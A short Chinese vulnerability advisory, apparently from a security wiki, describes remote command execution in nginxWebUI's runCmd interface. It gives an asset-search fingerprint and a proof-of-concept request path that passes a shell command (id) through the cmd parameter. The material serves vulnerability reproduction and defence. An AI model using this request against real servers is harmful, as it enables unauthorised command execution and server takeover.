# nginxWebUI runCmd 远程命令执行漏洞

## 漏洞描述

nginxWebUI runCmd 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取到服务器权限，执行任意命令

## 漏洞影响

<a-checkbox checked>nginxWebUI  </a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="nginxwebui" </a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1656223039336-00b1d204-6cba-4178-b152-fa38c63a72c1-6057456.png)

验证请求包

```php
/AdminPage/conf/runCmd?cmd=id
```

![img](../../../.vuepress/public/img/1686057565628-a73253da-a91a-4065-9fc0-2ce30caf1e5a.png)